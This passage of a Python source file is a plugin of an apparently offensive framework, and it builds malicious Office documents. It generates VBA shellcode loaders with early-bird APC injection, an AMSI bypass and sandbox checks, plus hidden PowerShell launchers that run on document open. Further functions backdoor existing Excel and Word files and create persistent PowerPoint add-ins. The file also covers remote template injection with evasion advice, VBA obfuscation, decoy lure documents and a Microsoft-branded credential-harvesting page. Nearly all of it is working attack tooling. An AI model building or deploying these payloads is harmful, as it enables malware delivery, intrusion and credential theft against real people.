      - 32-bit (VBA6/VBA7 x86): 68 bytes  (4-byte pointers)
      - 64-bit (VBA7 x64):      104 bytes (8-byte pointers + 4-byte cb pad)
      We use a Byte array sized for the larger case and set cb via #If VBA7.

    Handle extraction from PROCESS_INFORMATION:
      CopyMem (RtlMoveMemory ByRef→ByRef) copies the raw HANDLE bytes into
      typed LongPtr/Long variables without truncation.
    """
    # Single-backslash path for VBA string embedding
    tp  = target_process.replace("\\\\", "\\").replace("\\", "\\\\")
    prw = _PAGE_READWRITE
    prx = _PAGE_EXECUTE_READ
    mcr = _MEM_COMMIT_RESERVE
    cs  = _CREATE_SUSPENDED

    return f"""{_VBA_AMSI_BYPASS}
{_VBA_SANDBOX_GATE}

' ---------------------------------------------------------------------------
' Process-injection API declarations (not in the shared _VBA_API_DECLS block)
' ---------------------------------------------------------------------------
#If VBA7 Then
Private Declare PtrSafe Function CreateProcessA Lib "kernel32" _
    (ByVal lpApp As Long, ByVal lpCmd As String, _
     ByVal lpPA As Long, ByVal lpTA As Long, _
     ByVal bInherit As Long, ByVal dwFlags As Long, _
     ByVal lpEnv As Long, ByVal lpDir As Long, _
     ByRef lpSI As Any, ByRef lpPI As Any) As Long
Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" _
    (ByVal hProc As LongPtr, ByVal lpAddr As LongPtr, _
     ByVal dwSize As LongPtr, ByVal flAlloc As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" _
    (ByVal hProc As LongPtr, ByVal lpBase As LongPtr, _
     ByRef lpBuf As Any, ByVal nSize As LongPtr, ByRef nWritten As LongPtr) As Long
Private Declare PtrSafe Function VirtualProtectEx Lib "kernel32" _
    (ByVal hProc As LongPtr, ByVal lpAddr As LongPtr, _
     ByVal dwSize As LongPtr, ByVal flNew As Long, ByRef lpOld As Long) As Long
Private Declare PtrSafe Function QueueUserAPC Lib "kernel32" _
    (ByVal pfnAPC As LongPtr, ByVal hThr As LongPtr, ByVal dwData As LongPtr) As Long
Private Declare PtrSafe Function ResumeThread Lib "kernel32" _
    (ByVal hThread As LongPtr) As Long
Private Declare PtrSafe Function CloseHandle Lib "kernel32" _
    (ByVal hObj As LongPtr) As Long
Private Declare PtrSafe Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" _
    (ByRef dst As Any, ByRef src As Any, ByVal cb As LongPtr)
#Else
Private Declare Function CreateProcessA Lib "kernel32" _
    (ByVal lpApp As Long, ByVal lpCmd As String, _
     ByVal lpPA As Long, ByVal lpTA As Long, _
     ByVal bInherit As Long, ByVal dwFlags As Long, _
     ByVal lpEnv As Long, ByVal lpDir As Long, _
     ByRef lpSI As Any, ByRef lpPI As Any) As Long
Private Declare Function VirtualAllocEx Lib "kernel32" _
    (ByVal hProc As Long, ByVal lpAddr As Long, _
     ByVal dwSize As Long, ByVal flAlloc As Long, ByVal flProtect As Long) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" _
    (ByVal hProc As Long, ByVal lpBase As Long, _
     ByRef lpBuf As Any, ByVal nSize As Long, ByRef nWritten As Long) As Long
Private Declare Function VirtualProtectEx Lib "kernel32" _
    (ByVal hProc As Long, ByVal lpAddr As Long, _
     ByVal dwSize As Long, ByVal flNew As Long, ByRef lpOld As Long) As Long
Private Declare Function QueueUserAPC Lib "kernel32" _
    (ByVal pfnAPC As Long, ByVal hThr As Long, ByVal dwData As Long) As Long
Private Declare Function ResumeThread Lib "kernel32" _
    (ByVal hThread As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" _
    (ByVal hObj As Long) As Long
Private Declare Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" _
    (ByRef dst As Any, ByRef src As Any, ByVal cb As Long)
#End If

{vba_shellcode_src}

Private Sub ExecutePayload()
    On Error Resume Next
    PatchAmsi
    If Not SandboxCheck() Then Exit Sub

    ' STARTUPINFOA as a raw Byte buffer.
    ' 64-bit: cb = 104; 32-bit: cb = 68.  The cb DWORD sits at offset 0 in
    ' both layouts; remaining bytes default to zero (no std handles, no title).
#If VBA7 Then
    Dim si(103) As Byte
    Dim pi(23)  As Byte
    si(0) = 104
#Else
    Dim si(67) As Byte
    Dim pi(15) As Byte
    si(0) = 68
#End If

    Dim r   As Long
    Dim szB As Long
    szB = UBound(buf) + 1

    r = CreateProcessA(0, "{tp}", 0, 0, 0, {cs}, 0, 0, si(0), pi(0))
    If r = 0 Then Exit Sub

    ' Extract hProcess (offset 0) and hThread (offset 4 x86 / 8 x64) from PI.
#If VBA7 Then
    Dim hP  As LongPtr
    Dim hT  As LongPtr
    Dim mem As LongPtr
    Dim nw  As LongPtr
    CopyMem hP, pi(0), 8
    CopyMem hT, pi(8), 8
#Else
    Dim hP  As Long
    Dim hT  As Long
    Dim mem As Long
    Dim nw  As Long
    CopyMem hP, pi(0), 4
    CopyMem hT, pi(4), 4
#End If

    Dim old As Long
    mem = VirtualAllocEx(hP, 0, szB, {mcr}, {prw})
    If mem = 0 Then CloseHandle hP : CloseHandle hT : Exit Sub

    WriteProcessMemory hP, mem, buf(0), szB, nw
    VirtualProtectEx hP, mem, szB, {prx}, old

    ' Early-bird APC: queue shellcode to the suspended thread before it has
    ' reached its entry point.  ResumeThread drains the APC queue first.
    QueueUserAPC mem, hT, 0
    ResumeThread hT

    CloseHandle hP
    CloseHandle hT
End Sub

{_vba_trigger_sub(trigger_type, "ExecutePayload", is_word)}"""


def _vba_command_exec(
    trigger_binary: str,
    trigger_command: str,
    trigger_type: str,
    is_word: bool = False,
) -> str:
    """Command execution via WScript.Shell with filesystem payload search."""
    # Escape quotes for embedding in VBA string
    cmd = f"{trigger_binary} {trigger_command}".replace('"', '""')
    return f"""Private Sub ExecutePayload()
    On Error Resume Next
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run "{cmd}", 0, False
End Sub

{_vba_trigger_sub(trigger_type, "ExecutePayload", is_word)}"""


def _vba_powershell(
    command: str,
    trigger_type: str,
    encoded: bool = False,
    is_word: bool = False,
) -> str:
    """PowerShell execution via WScript.Shell."""
    if encoded:
        import base64
        enc = base64.b64encode(command.encode("utf-16-le")).decode()
        ps_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {enc}"
    else:
        escaped = command.replace('"', '""')
        ps_cmd = f"powershell.exe -NoP -W Hidden -Exec Bypass -C \"{escaped}\""
    return f"""Private Sub ExecutePayload()
    On Error Resume Next
    CreateObject("WScript.Shell").Run "{ps_cmd}", 0, False
End Sub

{_vba_trigger_sub(trigger_type, "ExecutePayload", is_word)}"""


def _vba_ppt_trigger(call_target: str) -> str:
    """PowerPoint auto-exec trigger — Presentation_Open fires on open."""
    return f"""Sub Auto_Open()
    {call_target}
End Sub

Sub Presentation_Open()
    {call_target}
End Sub
"""


# ---------------------------------------------------------------------------
# Helper: resolve template.xlsm / template.xlsx on disk
# ---------------------------------------------------------------------------

def _resolve_xl_template(output_path: Path) -> Optional[Path]:
    ext = output_path.suffix.lower()
    name = "template.xlsm" if ext in (".xlsm", ".xlam") else "template.xlsx"
    repo_root = Path(__file__).resolve().parents[2]
    candidates = [
        repo_root / "agent_code" / "templates" / name,
        Path(__file__).resolve().parent.parent / "templates" / name,
    ]
    for c in candidates:
        if c.exists():
            return c
    return None


# ---------------------------------------------------------------------------
# VBA obfuscation
# ---------------------------------------------------------------------------

_FRUIT_NAMES = [
    "Avocado", "Blueberry", "Cantaloupe", "Dragonfruit", "Elderberry",
    "Feijoa", "Gooseberry", "Honeydew", "Jackfruit", "Kumquat",
    "Lychee", "Mandarin", "Nectarine", "Persimmon", "Quince",
    "Raspberry", "Starfruit", "Tamarind", "Ugli", "Voavanga",
    "Wampee", "Ximenia", "Yangmei", "Ziziphus", "Pawpaw",
]


def _obfuscate_vba(source: str) -> str:
    """
    Minimal obfuscation pass:
    - Rename Dim'd variables to fruit-name aliases (avoids v1234 patterns)
    - Strip single-line comments (everything after ' that's not in a string)
    - Does NOT touch Declare statements, Sub/Function names, or Option lines.
    """
    import random
    random.shuffle(_FRUIT_NAMES)
    pool = list(_FRUIT_NAMES) + [f"v{secrets.token_hex(3)}" for _ in range(20)]

    name_map: dict = {}
    used: set = set()

    skip_rename = {"i", "j", "k", "r", "n", "h", "p", "b", "o", "mem", "hT",
                   "tid", "old", "si", "pi", "sh", "hP", "nw", "buf", "t0", "t1"}

    def _next_name() -> str:
        for nm in pool:
            if nm not in used:
                used.add(nm)
                return nm
        return f"v{secrets.token_hex(4)}"

    # Pass 1: collect variable declarations
    for m in re.finditer(
        r'\bDim\s+(\w+)\s+As\b',
        source,
        re.IGNORECASE,
    ):
        orig = m.group(1)
        if orig not in name_map and orig not in skip_rename and not orig.startswith("_"):
            name_map[orig] = _next_name()

    # Pass 2: apply renames
    for orig, new in name_map.items():
        source = re.sub(r'\b' + re.escape(orig) + r'\b', new, source)

    # Pass 3: strip line comments (naive but fast; skips Declare/Option/# lines)
    out_lines = []
    for line in source.splitlines():
        stripped = line.lstrip()
        if (stripped.startswith("'") or
                stripped.lower().startswith("declare") or
                stripped.lower().startswith("option") or
                stripped.startswith("#")):
            out_lines.append(line)
        else:
            # Remove inline comment (everything after first unquoted ')
            in_str = False
            clean = []
            for ch in line:
                if ch == '"':
                    in_str = not in_str
                if ch == "'" and not in_str:
                    break
                clean.append(ch)
            out_lines.append("".join(clean).rstrip())

    return "\n".join(out_lines)


# ---------------------------------------------------------------------------
# Decoy document / phishing page stubs
# ---------------------------------------------------------------------------

def _create_decoy_document(
    output_path: str,
    doc_type: str = "pdf",
    lure_text: str = "Please wait while the document loads...",
) -> Path:
    """
    Create a minimal decoy document shown to the victim while the loader runs.
    Currently supports: txt (always), pdf (if reportlab available), docx (minimal OOXML).
    """
    out = Path(output_path)
    out.parent.mkdir(parents=True, exist_ok=True)

    if doc_type == "txt":
        out.write_text(lure_text)
        return out

    if doc_type == "docx":
        body = f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>{lure_text}</w:t></w:r></w:p></w:body>
</w:document>"""
        buf = BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("[Content_Types].xml", """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>""")
            zf.writestr("_rels/.rels", _ROOT_RELS_OFFICE.format(target="word/document.xml"))
            zf.writestr("word/document.xml", body)
        out.write_bytes(buf.getvalue())
        return out

    # Fallback: plain text
    out.with_suffix(".txt").write_text(lure_text)
    return out.with_suffix(".txt")


def _create_phishing_page(
    output_path: str,
    brand: str = "Microsoft",
    title: str = "Sign In",
    post_url: str = "/",
    redirect_url: str = "https://www.microsoft.com",
) -> Path:
    """Return a minimal HTML credential-harvesting page."""
    out = Path(output_path)
    out.parent.mkdir(parents=True, exist_ok=True)
    html = f"""\
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>{brand} - {title}</title>
<style>body{{font-family:Segoe UI,Arial;background:#f3f2f1;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
.box{{background:#fff;padding:40px;width:360px;box-shadow:0 2px 6px rgba(0,0,0,.15)}}
h1{{font-size:1.5rem;margin-bottom:24px}}input{{width:100%;padding:8px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc}}
button{{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;cursor:pointer;font-size:1rem}}
</style></head><body>
<div class="box">
  <h1>{brand}</h1>
  <p>{title}</p>
  <form method="POST" action="{post_url}" onsubmit="setTimeout(()=>location='{redirect_url}',1500)">
    <input type="email" name="email" placeholder="Email" required>
    <input type="password" name="pass" placeholder="Password" required>
    <button type="submit">Sign in</button>
  </form>
</div></body></html>"""
    out.write_text(html, encoding="utf-8")
    return out


# ---------------------------------------------------------------------------
# Plugin class
# ---------------------------------------------------------------------------

class PayloadMalDocsPlugin(ErebusPlugin):
    """
    Unified VBA generation + Office document assembly plugin.
    Covers XLSM/XLAM, DOCM, PPTM/PPAM, and DOTM remote template injection.
    All formats are assembled on Linux (Docker) without Office or LibreOffice.
    """

    metadata = PluginMetadata(
        name="Payload MalDocs",
        version="2.0.0",
        category=PluginCategory.PAYLOAD,
        description="VBA generation and Office document construction for initial access",
        author="Whispergate",
    )

    def get_metadata(self) -> PluginMetadata:
        return self.metadata

    def validate(self):
        try:
            _load_vba_compiler()
        except Exception as e:
            return False, f"vba_compiler unavailable: {e}"
        return True, None

    def on_load(self):
        pass

    def register(self):
        return {
            # VBA source generators
            "generate_command_execution_vba":    self.generate_command_execution_vba,
            "generate_powershell_execution_vba": self.generate_powershell_execution_vba,
            "generate_shellcode_injection_vba":  self.generate_shellcode_injection_vba,
            "generate_vba_loader_createthread":  self.generate_vba_loader_createthread,
            "generate_vba_loader_enumlocales":   self.generate_vba_loader_enumlocales,
            "generate_vba_loader_queueuserapc":  self.generate_vba_loader_queueuserapc,
            "generate_vba_loader_process_hollowing": self.generate_vba_loader_process_hollowing,
            "generate_word_vba_loader":          self.generate_word_vba_loader,
            "obfuscate_vba":                     self.obfuscate_vba,
            # Excel document builders
            "generate_excel_payload":            self.generate_excel_payload,
            "backdoor_existing_excel":           self.backdoor_existing_excel,
            # Word document builders
            "generate_word_payload":             self.generate_word_payload,
            "backdoor_existing_word":            self.backdoor_existing_word,
            "create_new_word_with_payload":      self.generate_word_payload,
            "backdoor_word_document":            self.backdoor_existing_word,
            # PowerPoint builders
            "create_pptm_payload":               self.create_pptm_payload,
            "create_ppam_payload":               self.create_ppam_payload,
            # DOTM remote template
            "create_dotm_template_injection":    self.create_dotm_template_injection,
            # Utilities
            "export_vba_as_bas":                 self.export_vba_as_bas,
            "export_vba_as_text":                self.export_vba_as_text,
            # Decoy / phishing
            "create_decoy_document":             self.create_decoy_document,
            "create_phishing_page":              self.create_phishing_page,
        }

    # ------------------------------------------------------------------
    # Internal: build vbaProject.bin
    # ------------------------------------------------------------------

    def _compile_vba(self, source: str, module_name: str = "ErebusPayload") -> bytes:
        compile_vba_project = _load_vba_compiler()
        return compile_vba_project(source, module_name=module_name)

    # ------------------------------------------------------------------
    # VBA source generators (public API)
    # ------------------------------------------------------------------

    def generate_command_execution_vba(
        self,
        trigger_binary: str,
        trigger_command: str,
        trigger_type: str = "AutoOpen",
    ) -> str:
        return _vba_command_exec(trigger_binary, trigger_command, trigger_type)

    def generate_powershell_execution_vba(
        self,
        powershell_command: str,
        trigger_type: str = "AutoOpen",
        encoded: bool = False,
    ) -> str:
        return _vba_powershell(powershell_command, trigger_type, encoded)

    def generate_shellcode_injection_vba(
        self,
        vba_shellcode: str,
        trigger_type: str = "AutoOpen",
        loader_type: str = "createthread",
        target_process: str = "C:\\Windows\\System32\\notepad.exe",
    ) -> str:
        dispatch = {
            "createthread":      self.generate_vba_loader_createthread,
            "enumlocales":       self.generate_vba_loader_enumlocales,
            "queueuserapc":      self.generate_vba_loader_queueuserapc,
            "process_hollowing": lambda sc, tt: self.generate_vba_loader_process_hollowing(sc, tt, target_process),
            "earlybird":         self.generate_vba_loader_queueuserapc,
            "hollowing":         lambda sc, tt: self.generate_vba_loader_process_hollowing(sc, tt, target_process),
        }
        fn = dispatch.get(loader_type.lower(), self.generate_vba_loader_createthread)
        return fn(vba_shellcode, trigger_type)

    def generate_vba_loader_createthread(
        self,
        vba_shellcode: str,
        trigger_type: str = "AutoOpen",
    ) -> str:
        return _vba_createthread(vba_shellcode, trigger_type, is_word=False)

    def generate_vba_loader_enumlocales(
        self,
        vba_shellcode: str,
        trigger_type: str = "AutoOpen",
    ) -> str:
        return _vba_enumlocales(vba_shellcode, trigger_type, is_word=False)

    def generate_vba_loader_queueuserapc(
        self,
        vba_shellcode: str,
        trigger_type: str = "AutoOpen",
    ) -> str:
        return _vba_queueapc(vba_shellcode, trigger_type, is_word=False)

    def generate_vba_loader_process_hollowing(
        self,
        vba_shellcode: str,
        trigger_type: str = "AutoOpen",
        target_process: str = "C:\\Windows\\System32\\notepad.exe",
    ) -> str:
        return _vba_process_hollow(vba_shellcode, trigger_type, target_process, is_word=False)

    def generate_word_vba_loader(
        self,
        vba_shellcode: str,
        trigger_type: str = "AutoOpen",
        loader_type: str = "createthread",
        target_process: str = "C:\\Windows\\System32\\notepad.exe",
    ) -> str:
        dispatch = {
            "createthread":  lambda sc, tt: _vba_createthread(sc, tt, is_word=True),
            "enumlocales":   lambda sc, tt: _vba_enumlocales(sc, tt, is_word=True),
            "queueuserapc":  lambda sc, tt: _vba_queueapc(sc, tt, is_word=True),
            "earlybird":     lambda sc, tt: _vba_queueapc(sc, tt, is_word=True),
            "hollowing":     lambda sc, tt: _vba_process_hollow(sc, tt, target_process, is_word=True),
            "process_hollowing": lambda sc, tt: _vba_process_hollow(sc, tt, target_process, is_word=True),
        }
        fn = dispatch.get(loader_type.lower(), lambda sc, tt: _vba_createthread(sc, tt, is_word=True))
        return fn(vba_shellcode, trigger_type)

    def obfuscate_vba(self, vba_code: str) -> str:
        return _obfuscate_vba(vba_code)

    # ------------------------------------------------------------------
    # Excel document builders
    # ------------------------------------------------------------------

    def generate_excel_payload(
        self,
        payload_path: str,
        vba_payload: str,
        output_path: Optional[str] = None,
        template_path: Optional[str] = None,
    ) -> Path:
        out = Path(output_path or payload_path)
        out.parent.mkdir(parents=True, exist_ok=True)
        is_addin = out.suffix.lower() == ".xlam"
        vba_bin = self._compile_vba(vba_payload)
        tmpl = Path(template_path) if template_path else _resolve_xl_template(out)
        if tmpl and tmpl.exists():
            # Patch template instead of building minimal skeleton
            data = _inject_vba_into_ooxml(tmpl.read_bytes(), vba_bin, "xl/vbaProject.bin")
        else:
            data = _build_xlsm_bytes(vba_bin, is_addin=is_addin)
        out.write_bytes(data)
        return out

    def backdoor_existing_excel(
        self,
        source_excel: str,
        vba_payload: str,
        output_path: Optional[str] = None,
    ) -> Path:
        src = Path(source_excel)
        out = Path(output_path or source_excel)
        if out == src:
            tmp = src.with_suffix(".bak")
            shutil.copy2(str(src), str(tmp))
            src = tmp
        vba_bin = self._compile_vba(vba_payload)
        return _backdoor_existing_ooxml(
            src, vba_bin,
            vba_zip_path="xl/vbaProject.bin",
            rels_zip_path="xl/_rels/workbook.xml.rels",
            content_types_override="/xl/vbaProject.bin",
            content_type_value=_MS_CT_XL,
            output_path=out,
        )

    # ------------------------------------------------------------------
    # Word document builders
    # ------------------------------------------------------------------

    def generate_word_payload(
        self,
        payload_path: str,
        vba_payload: str,
        output_path: Optional[str] = None,
    ) -> Path:
        out = Path(output_path or payload_path)
        out.parent.mkdir(parents=True, exist_ok=True)
        vba_bin = self._compile_vba(vba_payload)
        out.write_bytes(_build_docm_bytes(vba_bin))
        return out

    def backdoor_existing_word(
        self,
        source_word: str,
        vba_payload: str,
        output_path: Optional[str] = None,
    ) -> Path:
        src = Path(source_word)
        out = Path(output_path or source_word)
        if out == src:
            tmp = src.with_suffix(".bak")
            shutil.copy2(str(src), str(tmp))
            src = tmp
        vba_bin = self._compile_vba(vba_payload)
        return _backdoor_existing_ooxml(
            src, vba_bin,
            vba_zip_path="word/vbaProject.bin",
            rels_zip_path="word/_rels/document.xml.rels",
            content_types_override="/word/vbaProject.bin",
            content_type_value=_MS_CT_WD,
            output_path=out,
        )

    # ------------------------------------------------------------------
    # PowerPoint builders
    # ------------------------------------------------------------------

    def create_pptm_payload(self, vba_source: str, output_path: str) -> Path:
        """
        Create a PowerPoint macro-enabled presentation (.pptm) with working VBA.
        Trigger: Auto_Open() / Presentation_Open() in standard module.
        OPSEC: POWERPNT.EXE hosts VBA; child-process spawns are monitored.
        """
        out = Path(output_path)
        out.parent.mkdir(parents=True, exist_ok=True)
        # Wrap with PPT-appropriate auto-exec triggers if not already present
        if "Presentation_Open" not in vba_source and "Auto_Open" not in vba_source:
            # Extract the first Sub name and wrap it
            m = re.search(r'\bSub\s+(\w+)\s*\(', vba_source)
            if m:
                vba_source = vba_source + "\n" + _vba_ppt_trigger(m.group(1) + "()")
        vba_bin = self._compile_vba(vba_source)
        out.write_bytes(_build_pptm_bytes(vba_bin, is_addin=False))
        return out

    def create_ppam_payload(self, vba_source: str, output_path: str) -> Path:
        """
        Create a PowerPoint Add-In (.ppam).
        Persists in %APPDATA%\\Microsoft\\AddIns\\ and re-executes on every
        PowerPoint launch after first open.
        OPSEC: survives reboots; removal requires clearing the add-in list.
        """
        out = Path(output_path)
        out.parent.mkdir(parents=True, exist_ok=True)
        if "Presentation_Open" not in vba_source and "Auto_Open" not in vba_source:
            m = re.search(r'\bSub\s+(\w+)\s*\(', vba_source)
            if m:
                vba_source = vba_source + "\n" + _vba_ppt_trigger(m.group(1) + "()")
        vba_bin = self._compile_vba(vba_source)
        out.write_bytes(_build_pptm_bytes(vba_bin, is_addin=True))
        return out

    # ------------------------------------------------------------------
    # DOTM remote template injection
    # ------------------------------------------------------------------

    def create_dotm_template_injection(
        self,
        template_url: str,
        output_path: str,
        lure_text: str = "Loading document, please wait...",
    ) -> Path:
        """
        Create a clean DOCX that silently fetches a macro-enabled DOTM on open.
        No macros in the delivered file — survives email gateway scanning.
        OPSEC: use a redirector serving 404 after first retrieval to defeat sandbox re-fetch.
        """
        out = Path(output_path)
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_bytes(_build_dotm_injection_bytes(template_url, lure_text))
        return out

    # ------------------------------------------------------------------
    # Utilities
    # ------------------------------------------------------------------

    def export_vba_as_bas(
        self,
        vba_code: str,
        output_path: Optional[str] = None,
        module_name: str = "Payload",
    ) -> Path:
        out = Path(output_path or f"{module_name}.bas")
        out.parent.mkdir(parents=True, exist_ok=True)
        header = f"Attribute VB_Name = \"{module_name}\"\r\n"
        if "Attribute VB_Name" not in vba_code:
            vba_code = header + vba_code
        out.write_text(vba_code, encoding="cp1252", errors="replace")
        return out

    def export_vba_as_text(
        self,
        vba_code: str,
        output_path: Optional[str] = None,
    ) -> Path:
        out = Path(output_path or "vba_payload.txt")
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(vba_code, encoding="utf-8")
        return out

    def create_decoy_document(
        self,
        output_path: str,
        doc_type: str = "docx",
        lure_text: str = "Please wait while the document loads...",
    ) -> Path:
        return _create_decoy_document(output_path, doc_type, lure_text)

    def create_phishing_page(
        self,
        output_path: str,
        brand: str = "Microsoft",
        title: str = "Sign In",
        post_url: str = "/",
        redirect_url: str = "https://www.microsoft.com",
    ) -> Path:
        return _create_phishing_page(output_path, brand, title, post_url, redirect_url)

    # ------------------------------------------------------------------
    # Builder-facing convenience wrappers
    # ------------------------------------------------------------------

    def _resolve_template_path(self, output_path: Path) -> Optional[Path]:
        """Return an Excel template path for the given output file, or None."""
        return _resolve_xl_template(output_path)

    def _resolve_word_template_path(self, output_path: Path) -> Optional[Path]:
        """Return a Word template path for the given output file, or None."""
        ext = output_path.suffix.lower()
        name = "template.docm" if ext == ".docm" else "template.docx"
        repo_root = Path(__file__).resolve().parents[2]
        candidates = [
            repo_root / "agent_code" / "templates" / name,
            Path(__file__).resolve().parent.parent / "templates" / name,
        ]
        for c in candidates:
            if c.exists():
                return c
        return None

    def create_new_excel_with_payload(
        self,
        output_path: Path,
        vba_code: str,
        document_name: str,
        template_path: Optional[Path] = None,
    ) -> Path:
        """Create a new XLSM/XLAM from scratch (or a template) with the given VBA."""
        out = Path(output_path)
        out.parent.mkdir(parents=True, exist_ok=True)
        is_addin = out.suffix.lower() == ".xlam"
        vba_bin = self._compile_vba(vba_code, module_name=document_name)
        if template_path and Path(template_path).exists():
            data = _inject_vba_into_ooxml(Path(template_path).read_bytes(), vba_bin, "xl/vbaProject.bin")
        else:
            data = _build_xlsm_bytes(vba_bin, is_addin=is_addin)
        out.write_bytes(data)
        return out

    def create_new_word_with_payload(
        self,
        output_path: Path,
        vba_code: str,
        document_name: str,
        template_path: Optional[Path] = None,
    ) -> Path:
        """Create a new DOCM from scratch (or a template) with the given VBA."""
        out = Path(output_path)
        out.parent.mkdir(parents=True, exist_ok=True)
        vba_bin = self._compile_vba(vba_code, module_name=document_name)
        if template_path and Path(template_path).exists():
            data = _inject_vba_into_ooxml(
                Path(template_path).read_bytes(), vba_bin, "word/vbaProject.bin"
            )
        else:
            data = _build_docm_bytes(vba_bin)
        out.write_bytes(data)
        return out

    def backdoor_word_document(
        self,
        source_path: Path,
        output_path: Path,
        vba_code: str,
    ) -> Path:
        """Inject VBA into an existing Word document (DOCM/DOC/DOCX)."""
        return self.backdoor_existing_word(
            source_word=str(source_path),
            vba_payload=vba_code,
            output_path=str(output_path),
        )


# ---------------------------------------------------------------------------
# Backward-compat alias: keep old plugin_payload_officedoc registration working
# by exposing the three functions builder.py might import from that module.
# ---------------------------------------------------------------------------

class PayloadOfficeDocPlugin(PayloadMalDocsPlugin):
    """
    Thin alias retained so any code that instantiates PayloadOfficeDocPlugin
    directly (e.g. builder.py lines that do PayloadOfficeDocPlugin().create_pptm_payload)
    continues to work without modification.
    """
    metadata = PluginMetadata(
        name="Payload OfficeDoc",
        version="2.0.0",
        category=PluginCategory.PAYLOAD,
        description="DOTM remote template injection, PowerPoint PPTM and PPAM (alias of PayloadMalDocs)",
        author="Whispergate",
    )


if __name__ == "__main__":
    p = PayloadMalDocsPlugin()
    ok, err = p.validate()
    print(f"[{'OK' if ok else 'FAIL'}] {err or 'vba_compiler reachable'}")
